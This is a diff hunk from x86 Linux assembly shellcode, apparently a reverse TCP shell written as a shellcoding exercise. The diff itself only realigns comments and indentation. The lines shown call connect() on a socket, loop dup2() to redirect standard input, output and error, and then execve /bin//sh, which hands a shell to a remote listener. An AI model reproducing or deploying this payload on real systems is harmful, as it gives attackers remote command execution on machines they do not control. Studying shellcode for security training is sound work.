@@ -258,26 +258,26 @@ _start:
 	push word 0x02
 
 	; connect() Syscall
-	mov ax, 0x16a ; Syscall for connect() = 362 OR 0x16a, loading it in AX
-	mov ecx, esp ; Moving sockaddr_in struct from TOS to ECX
-	mov dl, 16 ; socklen_t addrlen = 16
-	int 0x80 ; Execute the connect syscall
-
+	mov ax, 0x16a         ; Syscall for connect() = 362 OR 0x16a, loading it in AX
+	mov ecx, esp          ; Moving sockaddr_in struct from TOS to ECX
+	mov dl, 16            ; socklen_t addrlen = 16
+	int 0x80              ; Execute the connect syscall
+  	
 	xor ecx, ecx ; Clearing out ECX for 3rd Syscall - dup2()
 
 	mov cl, 0x3 ; Initializing a counter variable = 3 for loop
 
 	; dup2() Syscall in loop
 	loop_dup2:
-	mov al, 0x3f ; dup2() Syscall number = 63 OR 0x3f
-	dec ecx ; Decrement ECX by 1
-	int 0x80 ; Execute the dup2 syscall
-	jnz short loop_dup2 ; Jump back to loop_dup2 label until ZF is set
+	mov al, 0x3f           ; dup2() Syscall number = 63 OR 0x3f
+	dec ecx                ; Decrement ECX by 1
+	int 0x80               ; Execute the dup2 syscall
+	jnz short loop_dup2    ; Jump back to loop_dup2 label until ZF is set
 
 	; execve() Syscall
-    cdq                    ; Clearing out EDX
-    push edx               ; push for NULL termination
-    push dword 0x68732f2f  ; push //sh
+	cdq                    ; Clearing out EDX
+	push edx               ; push for NULL termination
+	push dword 0x68732f2f  ; push //sh
 	push dword 0x6e69622f  ; push /bin
 	mov ebx, esp           ; store address of TOS - /bin//sh
 	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
